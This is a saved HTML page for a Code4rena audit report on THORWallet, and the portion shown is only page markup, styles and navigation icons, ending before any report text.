<!DOCTYPE html>
<!-- saved from url=(0048)https://code4rena.com/reports/2025-02-thorwallet -->
<html lang="en" class="__variable_145019 __variable_7d3254 __variable_38ceec dark" style="background: var(--color__bg-l0); --wcm-color-fg-1: rgb(228,231,231); --wcm-color-fg-2: rgb(148,158,158); --wcm-color-fg-3: rgb(110,119,119); --wcm-color-bg-1: rgb(20,20,20); --wcm-color-bg-2: rgb(39,42,42); --wcm-color-bg-3: rgb(59,64,64); --wcm-color-overlay: rgba(255,255,255,0.1); --wcm-accent-color: #3396FF; --wcm-accent-fill-color: #FFFFFF; --wcm-z-index: 89; --wcm-background-color: #3396FF; --wcm-background-border-radius: 8px; --wcm-container-border-radius: 30px; --wcm-wallet-icon-border-radius: 15px; --wcm-wallet-icon-large-border-radius: 30px; --wcm-wallet-icon-small-border-radius: 7px; --wcm-input-border-radius: 28px; --wcm-button-border-radius: 10px; --wcm-notification-border-radius: 36px; --wcm-secondary-button-border-radius: 28px; --wcm-icon-button-border-radius: 50%; --wcm-button-hover-highlight-border-radius: 10px; --wcm-text-big-bold-size: 20px; --wcm-text-big-bold-weight: 600; --wcm-text-big-bold-line-height: 24px; --wcm-text-big-bold-letter-spacing: -0.03em; --wcm-text-big-bold-text-transform: none; --wcm-text-xsmall-bold-size: 10px; --wcm-text-xsmall-bold-weight: 700; --wcm-text-xsmall-bold-line-height: 12px; --wcm-text-xsmall-bold-letter-spacing: 0.02em; --wcm-text-xsmall-bold-text-transform: uppercase; --wcm-text-xsmall-regular-size: 12px; --wcm-text-xsmall-regular-weight: 600; --wcm-text-xsmall-regular-line-height: 14px; --wcm-text-xsmall-regular-letter-spacing: -0.03em; --wcm-text-xsmall-regular-text-transform: none; --wcm-text-small-thin-size: 14px; --wcm-text-small-thin-weight: 500; --wcm-text-small-thin-line-height: 16px; --wcm-text-small-thin-letter-spacing: -0.03em; --wcm-text-small-thin-text-transform: none; --wcm-text-small-regular-size: 14px; --wcm-text-small-regular-weight: 600; --wcm-text-small-regular-line-height: 16px; --wcm-text-small-regular-letter-spacing: -0.03em; --wcm-text-small-regular-text-transform: none; --wcm-text-medium-regular-size: 16px; --wcm-text-medium-regular-weight: 600; --wcm-text-medium-regular-line-height: 20px; --wcm-text-medium-regular-letter-spacing: -0.03em; --wcm-text-medium-regular-text-transform: none; --wcm-font-family: -apple-system, system-ui, BlinkMacSystemFont, &#39;Segoe UI&#39;, Roboto, Ubuntu, &#39;Helvetica Neue&#39;, sans-serif; --wcm-font-feature-settings: &#39;tnum&#39; on, &#39;lnum&#39; on, &#39;case&#39; on; --wcm-success-color: rgb(38,181,98); --wcm-error-color: rgb(242, 90, 103); --wcm-overlay-background-color: rgba(0, 0, 0, 0.3); --wcm-overlay-backdrop-filter: none;"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="stylesheet" href="./THORWallet_files/aa1e03632b0a9f00.css" data-precedence="next"><link rel="stylesheet" href="./THORWallet_files/2c612863d5a616cb.css" data-precedence="next"><link rel="preload" as="script" fetchpriority="low" href="./THORWallet_files/webpack-ee83ff9cf0b0c89c.js.download"><script src="./THORWallet_files/fd9d1056-eb8d5211d3c9c065.js.download" async=""></script><script src="./THORWallet_files/2117-a3b19a97c1cb31ce.js.download" async=""></script><script src="./THORWallet_files/main-app-3138c406eafafcb7.js.download" async=""></script><script src="./THORWallet_files/2972-f84899d403fe0acb.js.download" async=""></script><script src="./THORWallet_files/error-337d8165658cb655.js.download" async=""></script><script src="./THORWallet_files/da2599a7-883aa94cd391c09d.js.download" async=""></script><script src="./THORWallet_files/aaea2bcf-7a609d2a8547b978.js.download" async=""></script><script src="./THORWallet_files/c16f53c3-1c73b34d2bc72b67.js.download" async=""></script><script src="./THORWallet_files/0815f603-89dbad4b5756c5c4.js.download" async=""></script><script src="./THORWallet_files/5878-bdbba189b5f619d7.js.download" async=""></script><script src="./THORWallet_files/3504-22e800882144201d.js.download" async=""></script><script src="./THORWallet_files/4105-30871074ad2edc9d.js.download" async=""></script><script src="./THORWallet_files/6390-77d8d06791482011.js.download" async=""></script><script src="./THORWallet_files/5813-7499623caf5cc29b.js.download" async=""></script><script src="./THORWallet_files/1638-db2c32ae38fcd41e.js.download" async=""></script><script src="./THORWallet_files/191-92b4f6645071a623.js.download" async=""></script><title>THORWallet</title><title>Code4rena | Keeping high severity bugs out of production</title><meta name="description" content="Top auditors compete to keep high severity bugs out of production. Start a public or private audit within 48 hours."><meta name="application-name" content="Code4rena | Keeping high severity bugs out of production"><meta property="og:title" content="Code4rena"><meta property="og:description" content="Code4rena is a competitive audit platform that finds more high-severity vulnerabilities, more quickly than any other auditing method."><meta property="og:site_name" content="Code4rena"><meta property="og:image" content="https://code4rena.com/images/c4/c4-og-v2.png"><meta property="og:type" content="website"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="Code4rena"><meta name="twitter:description" content="Code4rena is a competitive audit platform that finds more high-severity vulnerabilities, more quickly than any other auditing method."><meta name="twitter:image" content="https://code4rena.com/images/c4/c4-og-v2.png"><link rel="icon" href="https://code4rena.com/favicon.ico" type="image/x-icon" sizes="256x256"><link rel="icon" href="https://code4rena.com/logos/c4/c4-favicon-32.png"><link rel="apple-touch-icon" href="https://code4rena.com/logos/c4/apple-touch-icon.png"><meta name="next-size-adjust"><title>THORWallet</title><meta property="og:title" content="THORWallet"><meta name="twitter:title" content="THORWallet"><script src="./THORWallet_files/polyfills-42372ed130431b0a.js.download" nomodule=""></script><link rel="preload" href="https://code4rena.com/_next/static/media/9b7eb431f23ca42e-s.p.woff2" as="font" crossorigin="" type="font/woff2"><link rel="preload" href="https://code4rena.com/_next/static/media/b603571150b520e0-s.p.ttf" as="font" crossorigin="" type="font/ttf"><link rel="preload" href="https://code4rena.com/_next/static/media/d9396795aa5ec363-s.p.woff2" as="font" crossorigin="" type="font/woff2"><style id="mttstyle">
    #mttContainer {
      left: 0 !important;
      top: 0 !important;
      width: 1000px !important;
      margin: 0px !important;
      margin-left: -500px !important;
      position: fixed !important;
      z-index: 2147483647 !important; /* Maximum z-index to overcome overlays */
      background: none !important;
      pointer-events: none !important;
      display: inline-block !important;
      visibility: visible  !important;
      white-space: pre-line;
    }
    .tippy-box[data-theme~="custom"], .tippy-box[data-theme~="ocr"], .tippy-content *{
      font-size: 18px  !important;
      text-align: center !important;
      overflow-wrap: break-word !important;
      color: #ffffffff !important;
      font-family: 
        -apple-system, BlinkMacSystemFont,
        "Segoe UI", "Roboto", "Oxygen",
        "Ubuntu", "Cantarell", "Fira Sans",
        "Droid Sans", "Helvetica Neue", sans-serif  !important;
      white-space: pre-line;
    }
    .tippy-box[data-theme~="custom"]{
      max-width: 200px  !important;
      backdrop-filter: blur(6px) !important;
      background-color: #00000080 !important;
      border: 1px solid #ffffff00; 
      box-shadow: rgba(50, 50, 93, 0.25) 0px 2px 5px -1px, rgba(0, 0, 0, 0.3) 0px 1px 3px -1px;
      opacity: 1.0; /* Adjusted opacity for transparency */
    }
    .tippy-box[data-theme~="ocr"]{
      max-width: $1000px  !important;
      backdrop-filter: blur(6px) !important;
      background-color: #00000080 !important;
      border: 1px solid #ffffff00; 
      box-shadow: rgba(50, 50, 93, 0.25) 0px 2px 5px -1px, rgba(0, 0, 0, 0.3) 0px 1px 3px -1px;
      opacity: 1.0; /* Adjusted opacity for transparency */
    }
    .tippy-box[data-theme~="transparent"] {
      max-width: $1000px  !important;
      backdrop-filter: blur(6px) !important;
      background-color: #00000080 !important;
      border: 1px solid #ffffff00; 
      box-shadow: rgba(50, 50, 93, 0.25) 0px 2px 5px -1px, rgba(0, 0, 0, 0.3) 0px 1px 3px -1px;
      opacity: 0.0; /* Adjusted opacity for transparency */
      transition: opacity 0.3s ease-in-out; /* Added transition for opacity */
    }
    [data-tippy-root] {
      display: inline-block !important;
      visibility: visible  !important;
      position: absolute !important;
    }
    .tippy-box[data-theme~='custom'][data-placement^='top'] > .tippy-arrow::before, .tippy-box[data-theme~='ocr'][data-placement^='top'] > .tippy-arrow::before { 
      border-top-color: #00000080 !important;
    }
    .tippy-box[data-theme~='custom'][data-placement^='bottom'] > .tippy-arrow::before, .tippy-box[data-theme~='ocr'][data-placement^='bottom'] > .tippy-arrow::before {
      border-bottom-color: #00000080 !important;
    }
    .tippy-box[data-theme~='custom'][data-placement^='left'] > .tippy-arrow::before, .tippy-box[data-theme~='ocr'][data-placement^='left'] > .tippy-arrow::before {
      border-left-color: #00000080 !important;
    }
    .tippy-box[data-theme~='custom'][data-placement^='right'] > .tippy-arrow::before, .tippy-box[data-theme~='ocr'][data-placement^='right'] > .tippy-arrow::before {
      border-right-color: #00000080 !important;
    }

    .mtt-highlight{
      background-color: #21dc6d40  !important;
      position: absolute !important;   
      z-index: 2147483646 !important; /* Slightly lower than tooltip */
      pointer-events: none !important;
      display: inline !important;
      border-radius: 3px !important;
    }
    .mtt-image{
      width: 180px  !important;
      border-radius: 3px !important;
    }
    .ocr_text_div{
      position: absolute;
      opacity: 0.4;
      color: transparent !important;
      border: 2px solid CornflowerBlue;
      background: none !important;
      border-radius: 3px !important;
    }</style><style id="mttstyleSubtitle">
    #ytp-caption-window-container .ytp-caption-segment {
      cursor: text !important;
      user-select: text !important;
      font-family: 
      -apple-system, BlinkMacSystemFont,
      "Segoe UI", "Roboto", "Oxygen",
      "Ubuntu", "Cantarell", "Fira Sans",
      "Droid Sans", "Helvetica Neue", sans-serif  !important;
    }
    .caption-visual-line{
      display: flex  !important;
      align-items: stretch  !important;
      direction: ltr
    }
    .captions-text .caption-visual-line:first-of-type:after {
      content: '⣿⣿';
      border-radius: 3px !important;
      color: white !important;
      background: transparent !important;
      box-shadow: rgba(50, 50, 93, 0.25) 0px 30px 60px -12px inset, rgba(0, 0, 0, 0.3) 0px 18px 36px -18px inset;
      display: inline-block;
      vertical-align: top;
      opacity:0;
      transition: opacity 0.7s ease-in-out;
    }
    .ytp-caption-segment{
      color: white !important;
      text-shadow: 1px 1px 2px black !important;
      backdrop-filter: blur(3px) !important;
      background: rgba(8, 8, 8, 0.1)  !important;
    }
    .captions-text:hover .caption-visual-line:first-of-type:after {
      opacity:1;
    }
    .ytp-pause-overlay {
      display: none !important;
    }
    .ytp-expand-pause-overlay .caption-window {
      display: block !important;
    }
  </style></head><body><div class="wrapper__grid"><div class="Toastify"></div><div class="core-app"><div class="core-app--header-options--wrapper no-print"><button type="button" aria-controls="core_app_nav" aria-expanded="false" aria-label="Expand sidebar" class="core-app--hamburger"><svg class="core-app--hamburger--icon" width="24px" height="24px" viewBox="0 0 22 22" fill="none" xmlns="http://www.w3.org/2000/svg"><g id="menu"><g id="Vector"><path fill="var(--color__text-tertiary)" fill-rule="evenodd" clip-rule="evenodd" d="M2.99988 10.7333C2.99988 10.2362 3.40282 9.83325 3.89988 9.83325H18.5665C19.0636 9.83325 19.4665 10.2362 19.4665 10.7333C19.4665 11.2303 19.0636 11.6333 18.5665 11.6333H3.89988C3.40282 11.6333 2.99988 11.2303 2.99988 10.7333Z"></path><path fill="var(--color__text-tertiary)" fill-rule="evenodd" clip-rule="evenodd" d="M2.99988 5.23325C2.99988 4.7362 3.40282 4.33325 3.89988 4.33325H18.5665C19.0636 4.33325 19.4665 4.7362 19.4665 5.23325C19.4665 5.73031 19.0636 6.13325 18.5665 6.13325H3.89988C3.40282 6.13325 2.99988 5.73031 2.99988 5.23325Z"></path><path fill="var(--color__text-tertiary)" fill-rule="evenodd" clip-rule="evenodd" d="M2.99988 16.2333C2.99988 15.7362 3.40282 15.3333 3.89988 15.3333H18.5665C19.0636 15.3333 19.4665 15.7362 19.4665 16.2333C19.4665 16.7303 19.0636 17.1333 18.5665 17.1333H3.89988C3.40282 17.1333 2.99988 16.7303 2.99988 16.2333Z"></path></g></g></svg></button></div><div class="core-app--nav--wrapper no-print"><nav id="core_app_nav" class="core-app--nav collapsed-mobile"><header class="core-app--nav--header"><a class="logo-link-notification-trigger mobile-collapsed no-unread" aria-label="Navigate to home" href="https://code4rena.com/"><img alt="C4 Logo" loading="lazy" width="28" height="28" decoding="async" data-nimg="1" class="app--logo" style="color:transparent" src="./THORWallet_files/c4-logo-icon.svg"></a><button class="logo-button-notification-trigger no-unread" type="button" aria-controls="core_app_notifications_popup" aria-expanded="false" aria-label="Open notifications"><img alt="C4 Logo" loading="lazy" width="28" height="28" decoding="async" data-nimg="1" class="app--logo" style="color:transparent" src="./THORWallet_files/c4-logo-icon.svg"></button><button type="button" class="bell-notification--trigger" aria-controls="core_app_notifications_popup" aria-expanded="false" aria-label="Open notifications"><svg width="24px" height="24px" viewBox="0 0 22 22" fill="none" xmlns="http://www.w3.org/2000/svg"><path stroke="var(--color__text-primary)" d="M15.1333 8.33333C15.1333 7.18406 14.6768 6.08186 13.8641 5.2692C13.0515 4.45655 11.9493 4 10.8 4C9.65072 4 8.54852 4.45655 7.73586 5.2692C6.9232 6.08186 6.46665 7.18406 6.46665 8.33333C6.46665 13.3889 4.29999 14.8333 4.29999 14.8333H17.3C17.3 14.8333 15.1333 13.3889 15.1333 8.33333Z" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path><path stroke="var(--color__text-primary)" d="M12.0495 17.7223C11.9225 17.9412 11.7402 18.1229 11.521 18.2492C11.3017 18.3755 11.0531 18.442 10.8 18.442C10.547 18.442 10.2983 18.3755 10.0791 18.2492C9.85979 18.1229 9.67754 17.9412 9.55057 17.7223" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path></svg></button><button type="button" class="core-app--nav--mobile-collapsible" aria-controls="core_app_nav" aria-expanded="false" aria-label="Collapse sidebar"><svg width="24px" height="24px" viewBox="0 0 22 22" fill="none" xmlns="http://www.w3.org/2000/svg"><g><path fill="var(--color__text-primary)" fill-rule="evenodd" clip-rule="evenodd" d="M5.26351 5.2636C5.61498 4.91213 6.18483 4.91213 6.5363 5.2636L11.3999 10.1272L16.2635 5.2636C16.615 4.91213 17.1848 4.91213 17.5363 5.2636C17.8878 5.61508 17.8878 6.18492 17.5363 6.5364L12.6727 11.4L17.5363 16.2636C17.8878 16.6151 17.8878 17.1849 17.5363 17.5364C17.1848 17.8879 16.615 17.8879 16.2635 17.5364L11.3999 12.6728L6.5363 17.5364C6.18483 17.8879 5.61498 17.8879 5.26351 17.5364C4.91204 17.1849 4.91204 16.6151 5.26351 16.2636L10.1271 11.4L5.26351 6.5364C4.91204 6.18492 4.91204 5.61508 5.26351 5.2636Z"></path></g></svg></button></header><div class="core-app--nav--content"><section><ul class="core-app--nav--group"><li class="core-app--nav--link"><a aria-describedby="core-app--nav--tooltip" aria-label="News" href="https://code4rena.com/"><div class="logo-24"><img alt="News" loading="lazy" decoding="async" data-nimg="fill" style="position:absolute;height:100%;width:100%;left:0;top:0;right:0;bottom:0;color:transparent" src="./THORWallet_files/32.svg"></div><p class="core-app--link--label">News</p></a></li><li class="core-app--nav--link"><a aria-describedby="core-app--nav--tooltip" aria-label="Leaderboard" href="https://code4rena.com/leaderboard"><svg class="core-app--link--icon" width="24px" height="24px" viewBox="0 0 22 22" fill="none" xmlns="http://www.w3.org/2000/svg"><g><path fill="var(--color__text-tertiary)" fill-rule="evenodd" clip-rule="evenodd" d="M9.10789 3.09263C9.79177 1.63579 11.8639 1.63579 12.5477 3.09263L14.197 6.60605C14.2112 6.63621 14.2394 6.65734 14.2724 6.6624L18.0423 7.24182C19.5703 7.47667 20.1931 9.34094 19.1131 10.4471L16.3245 13.3031C16.3023 13.3259 16.2923 13.3578 16.2974 13.3891L16.9465 17.369C17.2019 18.9345 15.5399 20.1051 14.1518 19.3376L10.8762 17.5262C10.8461 17.5095 10.8095 17.5095 10.7794 17.5262L7.5038 19.3376C6.11573 20.1051 4.45379 18.9345 4.70913 17.369L5.35828 13.3891C5.36339 13.3578 5.35331 13.3259 5.33113 13.3031L2.54256 10.4471C1.4625 9.34094 2.08531 7.47667 3.61339 7.24182L7.38328 6.6624C7.41621 6.65734 7.44445 6.63621 7.45861 6.60605L9.10789 3.09263ZM10.7725 3.81389C10.7638 3.81911 10.7507 3.82897 10.7373 3.85751L9.08802 7.37093C8.81904 7.94393 8.28237 8.34535 7.65672 8.44151L3.88683 9.02092C3.85803 9.02535 3.84468 9.03447 3.83657 9.04159C3.82586 9.051 3.81435 9.0666 3.80717 9.08808C3.8 9.10955 3.79982 9.12894 3.80273 9.1429C3.80493 9.15347 3.81011 9.16878 3.83047 9.18962L6.61904 12.0456C7.0405 12.4773 7.23192 13.0834 7.1348 13.6789L6.48565 17.6588C6.48072 17.689 6.48571 17.7045 6.48993 17.714C6.49571 17.727 6.5075 17.743 6.52676 17.7566C6.54602 17.7702 6.5651 17.7759 6.57928 17.7769C6.58962 17.7777 6.60593 17.7772 6.63274 17.7624L9.90837 15.951C10.4805 15.6346 11.1751 15.6346 11.7473 15.951L15.0229 17.7624C15.0497 17.7772 15.066 17.7777 15.0764 17.7769C15.0905 17.7759 15.1096 17.7702 15.1289 17.7566C15.1481 17.743 15.1599 17.727 15.1657 17.714C15.1699 17.7045 15.1749 17.689 15.17 17.6588L14.5208 13.6789C14.4237 13.0834 14.6151 12.4773 15.0366 12.0456L17.8252 9.18962C17.8455 9.16878 17.8507 9.15347 17.8529 9.1429C17.8558 9.12894 17.8556 9.10955 17.8485 9.08808C17.8413 9.0666 17.8298 9.051 17.8191 9.04159C17.811 9.03447 17.7976 9.02535 17.7688 9.02092L13.9989 8.44151C13.3733 8.34535 12.8366 7.94393 12.5676 7.37093L10.9183 3.85751C10.9049 3.82897 10.8918 3.81911 10.8832 3.81389C10.8711 3.80655 10.8519 3.8 10.8278 3.8C10.8037 3.8 10.7846 3.80655 10.7725 3.81389Z"></path></g></svg><p class="core-app--link--label">Leaderboard</p></a></li><li class="core-app--nav--link"><a aria-describedby="core-app--nav--tooltip" aria-label="Submissions" href="https://code4rena.com/your-submissions"><svg class="core-app--link--icon" width="24px" height="24px" viewBox="0 0 22 22" fill="none" xmlns="http://www.w3.org/2000/svg"><g><g><path fill="var(--color__text-tertiary)" fill-rule="evenodd" clip-rule="evenodd" d="M6.54287 3C5.92151 3 5.32559 3.24684 4.88622 3.68621C4.44685 4.12558 4.20001 4.72149 4.20001 5.34286V17.0571C4.20001 17.6785 4.44685 18.2744 4.88622 18.7138C5.32559 19.1532 5.9215 19.4 6.54287 19.4H15.3286C15.9499 19.4 16.5459 19.1532 16.9852 18.7138C17.4246 18.2744 17.6714 17.6785 17.6714 17.0571V8.27143C17.6714 8.03842 17.5789 7.81495 17.4141 7.65018L13.0213 3.25733C12.8565 3.09256 12.633 3 12.4 3H6.54287ZM6.12871 4.92869C6.23855 4.81885 6.38753 4.75714 6.54287 4.75714H11.6679V8.27145C11.6679 8.6758 11.9957 9.0036 12.4 9.0036H15.9143V17.0571C15.9143 17.2125 15.8526 17.3615 15.7427 17.4713C15.6329 17.5811 15.4839 17.6429 15.3286 17.6429H6.54287C6.38753 17.6429 6.23855 17.5811 6.12871 17.4713C6.01886 17.3615 5.95716 17.2125 5.95716 17.0571V5.34286C5.95716 5.18752 6.01886 5.03854 6.12871 4.92869ZM14.8183 7.53931L13.1322 5.85323V7.53931H14.8183Z"></path><path fill="var(--color__text-tertiary)" fill-rule="evenodd" clip-rule="evenodd" d="M7.27501 11.9321C7.27501 11.5278 7.6028 11.2 8.00716 11.2H13.8643C14.2687 11.2 14.5964 11.5278 14.5964 11.9321C14.5964 12.3365 14.2687 12.6643 13.8643 12.6643H8.00716C7.6028 12.6643 7.27501 12.3365 7.27501 11.9321Z"></path><path fill="var(--color__text-tertiary)" fill-rule="evenodd" clip-rule="evenodd" d="M7.27501 14.8607C7.27501 14.4564 7.6028 14.1286 8.00716 14.1286H13.8643C14.2687 14.1286 14.5964 14.4564 14.5964 14.8607C14.5964 15.2651 14.2687 15.5929 13.8643 15.5929H8.00716C7.6028 15.5929 7.27501 15.2651 7.27501 14.8607Z"></path><path fill="var(--color__text-tertiary)" fill-rule="evenodd" clip-rule="evenodd" d="M7.27501 9.00357C7.27501 8.59922 7.6028 8.27143 8.00716 8.27143H9.47144C9.87579 8.27143 10.2036 8.59922 10.2036 9.00357C10.2036 9.40792 9.87579 9.73571 9.47144 9.73571H8.00716C7.6028 9.73571 7.27501 9.40792 7.27501 9.00357Z"></path></g></g></svg><p class="core-app--link--label">Submissions</p></a></li></ul></section><hr class="core-app--hr"><section><p class="core-app--nav--heading">Explore C4</p><ul class="core-app--nav--group"><li class="core-app--nav--link"><a aria-describedby="core-app--nav--tooltip" aria-label="Audits" href="https://code4rena.com/audits"><svg class="core-app--link--icon" width="24px" height="24px" viewBox="0 0 22 22" fill="none" xmlns="http://www.w3.org/2000/svg"><g><path fill="var(--color__text-tertiary)" fill-rule="evenodd" clip-rule="evenodd" d="M9.81977 3.31602C10.1791 3.10898 10.5866 3 11.0014 3C11.4161 3 11.8236 3.10898 12.1829 3.31602C12.1836 3.31638 12.1842 3.31675 12.1848 3.31711L17.3192 6.25104C17.6787 6.45858 17.9773 6.75701 18.185 7.11637C18.3927 7.47573 18.5023 7.8834 18.5027 8.29848V14.1673C18.5023 14.5823 18.3927 14.9909 18.185 15.3503C17.9773 15.7097 17.6787 16.0081 17.3192 16.2156L17.3158 16.2176L12.1848 19.1496C12.1842 19.1499 12.1835 19.1503 12.1829 19.1507C11.8236 19.3577 11.4161 19.4667 11.0014 19.4667C10.5866 19.4667 10.1792 19.3577 9.8198 19.1507C9.81916 19.1503 9.81851 19.1499 9.81787 19.1496L4.68696 16.2176L4.68348 16.2156C4.32402 16.0081 4.02544 15.7097 3.81772 15.3503C3.61 14.9909 3.50043 14.5833 3.5 14.1682L3.5 8.2994C3.50043 7.88432 3.61 7.47573 3.81772 7.11637C4.02544 6.75701 4.32402 6.45859 4.68348 6.25105L4.68695 6.24904L9.81977 3.31602ZM11.0014 4.8C10.9018 4.8 10.8041 4.8262 10.7179 4.87596L10.7144 4.87796L5.58214 7.81067C5.49664 7.86035 5.4256 7.93154 5.3761 8.01717C5.32641 8.10314 5.30016 8.20066 5.3 8.29996V14.1667C5.30016 14.266 5.32641 14.3635 5.3761 14.4495C5.4256 14.5351 5.49662 14.6063 5.58212 14.656C5.58257 14.6562 5.58303 14.6565 5.58348 14.6568L10.7179 17.5907C10.8041 17.6405 10.9018 17.6667 11.0014 17.6667C11.1009 17.6667 11.1986 17.6405 11.2848 17.5907L11.2883 17.5887L16.4192 14.6568C16.4197 14.6565 16.4201 14.6562 16.4206 14.656C16.5061 14.6063 16.5771 14.5351 16.6266 14.4495C16.6763 14.3636 16.7025 14.2662 16.7027 14.167C16.7027 14.1668 16.7027 14.1672 16.7027 14.167L16.7027 8.30032C16.7027 8.30012 16.7027 8.30052 16.7027 8.30032C16.7025 8.20111 16.6763 8.10307 16.6266 8.01717C16.5771 7.93154 16.5061 7.86036 16.4206 7.81068C16.4201 7.81042 16.4197 7.81015 16.4192 7.80989L11.2848 4.87597C11.1986 4.82621 11.1009 4.8 11.0014 4.8Z"></path></g></svg><p class="core-app--link--label">Audits</p></a></li><li class="core-app--nav--link"><a aria-describedby="core-app--nav--tooltip" aria-label="Bounties" href="https://code4rena.com/bounties"><svg width="24" height="24" xmlns="http://www.w3.org/2000/svg" fill="none" class="core-app--link--icon"><path fill-rule="evenodd" clip-rule="evenodd" d="M13.808 6.5083C14.984 6.5086 16.1117 6.97597 16.9431 7.80763C17.7746 8.63929 18.2417 9.76714 18.2417 10.9431V13.75C18.2417 14.701 18.0544 15.6426 17.6904 16.5212C17.3265 17.3998 16.7931 18.1981 16.1206 18.8706C15.4482 19.543 14.6499 20.0765 13.7713 20.4404C12.8927 20.8043 11.951 20.9916 11 20.9916C10.049 20.9916 9.10733 20.8043 8.22873 20.4404C7.35013 20.0765 6.55182 19.543 5.87937 18.8706C5.20692 18.1981 4.6735 17.3998 4.30957 16.5212C3.94564 15.6426 3.75833 14.701 3.75833 13.75V10.9431C3.75833 9.76733 4.22526 8.63966 5.05647 7.80803C5.88767 6.9764 7.01511 6.5089 8.19091 6.5083L13.808 6.5083ZM8.19175 8.1583C8.1917 8.1583 8.19165 8.1583 8.19161 8.1583C8.19151 8.1583 8.19142 8.1583 8.19133 8.1583C7.45314 8.15879 6.74534 8.45234 6.22349 8.97446C5.70154 9.49668 5.40833 10.2048 5.40833 10.9431V13.75C5.40833 14.4843 5.55296 15.2114 5.83397 15.8898C6.11498 16.5682 6.52686 17.1846 7.04609 17.7039C7.56533 18.2231 8.18175 18.635 8.86016 18.916C9.53857 19.197 10.2657 19.3416 11 19.3416C11.7343 19.3416 12.4614 19.197 13.1398 18.916C13.8182 18.635 14.4347 18.2231 14.9539 17.7039C15.4731 17.1846 15.885 16.5682 16.166 15.8898C16.447 15.2114 16.5917 14.4843 16.5917 13.75V10.9431C16.5917 10.2047 16.2984 9.49645 15.7763 8.97421C15.2542 8.45202 14.5461 8.15854 13.8077 8.1583M8.19175 8.1583H13.8075Z" fill="var(--color__text-tertiary)"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M7.49981 3.37487C8.42811 2.44657 9.68717 1.92505 11 1.92505C12.3128 1.92505 13.5719 2.44657 14.5002 3.37487C15.4285 4.30317 15.95 5.56223 15.95 6.87505V7.79171H14.3V6.87505C14.3 5.99983 13.9523 5.16047 13.3334 4.5416C12.7146 3.92273 11.8752 3.57505 11 3.57505C10.1248 3.57505 9.28541 3.92273 8.66654 4.5416C8.04767 5.16047 7.69999 5.99983 7.69999 6.87505V7.79171H6.04999V6.87505C6.04999 5.56223 6.5715 4.30317 7.49981 3.37487Z" fill="var(--color__text-tertiary)"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M2.44234 7.02688C2.61156 6.60383 3.09168 6.39806 3.51473 6.56728L5.34806 7.30062C5.77111 7.46983 5.97688 7.94996 5.80766 8.37301C5.63844 8.79605 5.15831 9.00182 4.73527 8.8326L2.90193 8.09927C2.47889 7.93005 2.27312 7.44993 2.44234 7.02688ZM19.5577 7.02688C19.7269 7.44993 19.5211 7.93005 19.0981 8.09927L17.2647 8.8326C16.8417 9.00182 16.3616 8.79605 16.1923 8.37301C16.0231 7.94996 16.2289 7.46983 16.6519 7.30062L18.4853 6.56728C18.9083 6.39806 19.3884 6.60383 19.5577 7.02688ZM1.00833 12.8333C1.00833 12.3776 1.3777 12.0083 1.83333 12.0083H4.58333C5.03897 12.0083 5.40833 12.3776 5.40833 12.8333C5.40833 13.2889 5.03897 13.6583 4.58333 13.6583H1.83333C1.3777 13.6583 1.00833 13.2889 1.00833 12.8333ZM16.5917 12.8333C16.5917 12.3776 16.961 12.0083 17.4167 12.0083H20.1667C20.6223 12.0083 20.9917 12.3776 20.9917 12.8333C20.9917 13.2889 20.6223 13.6583 20.1667 13.6583H17.4167C16.961 13.6583 16.5917 13.2889 16.5917 12.8333ZM11 12.9249C11.4556 12.9249 11.825 13.2943 11.825 13.7499V19.7083C11.825 20.1639 11.4556 20.5333 11 20.5333C10.5444 20.5333 10.175 20.1639 10.175 19.7083V13.7499C10.175 13.2943 10.5444 12.9249 11 12.9249ZM5.80766 17.2935C5.97688 17.7166 5.77111 18.1967 5.34806 18.3659L3.51473 19.0993C3.09168 19.2685 2.61156 19.0627 2.44234 18.6397C2.27312 18.2166 2.47889 17.7365 2.90193 17.5673L4.73527 16.834C5.15831 16.6647 5.63844 16.8705 5.80766 17.2935ZM16.1923 17.2935C16.3616 16.8705 16.8417 16.6647 17.2647 16.834L19.0981 17.5673C19.5211 17.7365 19.7269 18.2166 19.5577 18.6397C19.3884 19.0627 18.9083 19.2685 18.4853 19.0993L16.6519 18.3659C16.2289 18.1967 16.0231 17.7166 16.1923 17.2935Z" fill="var(--color__text-tertiary)"></path></svg><p class="core-app--link--label">Bounties</p></a></li><li class="core-app--nav--link"><a aria-describedby="core-app--nav--tooltip" aria-label="Reports" href="https://code4rena.com/reports"><svg class="core-app--link--icon" width="24px" height="24px" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><g><g><path fill="var(--color__text-tertiary)" fill-rule="evenodd" clip-rule="evenodd" d="M14.9389 4.07141H15.625C16.2956 4.07141 16.9111 4.37228 17.3448 4.86051C17.7752 5.34489 18 5.97903 18 6.61903V17.4524C18 18.0924 17.7752 18.7265 17.3448 19.2109C16.9111 19.6991 16.2956 20 15.625 20H7.375C6.70438 20 6.08893 19.6991 5.65516 19.2109C5.22481 18.7265 5 18.0924 5 17.4524V6.61903C5 5.97903 5.22481 5.34489 5.65516 4.86051C6.08893 4.37228 6.70438 4.07141 7.375 4.07141H8.06109C8.28105 3.34179 9.05005 3 9.625 3H13.375C13.9499 3 14.7189 3.34179 14.9389 4.07141ZM8.11306 6.07141H7.375C7.31628 6.07141 7.23225 6.09664 7.1503 6.18888C7.06492 6.28497 7 6.43812 7 6.61903V17.4524C7 17.6333 7.06492 17.7864 7.1503 17.8825C7.23225 17.9748 7.31628 18 7.375 18H15.625C15.6837 18 15.7677 17.9748 15.8497 17.8825C15.9351 17.7864 16 17.6333 16 17.4524V6.61903C16 6.43812 15.9351 6.28498 15.8497 6.18888C15.7678 6.09664 15.6837 6.07141 15.625 6.07141H14.8869C14.6157 6.7029 13.911 7 13.375 7H9.625C9.08896 7 8.38425 6.7029 8.11306 6.07141Z"></path></g></g></svg><p class="core-app--link--label">Reports</p></a></li><li class="core-app--nav--link"><a aria-describedby="core-app--nav--tooltip" aria-label="Docs (opens in new window)" target="_blank" rel="noreferrer noopener" href="https://docs.code4rena.com/"><svg class="core-app--link--icon" width="24px" height="24px" viewBox="0 0 22 22" fill="none" xmlns="http://www.w3.org/2000/svg"><g><g><path fill="var(--color__text-tertiary)" fill-rule="evenodd" clip-rule="evenodd" d="M11 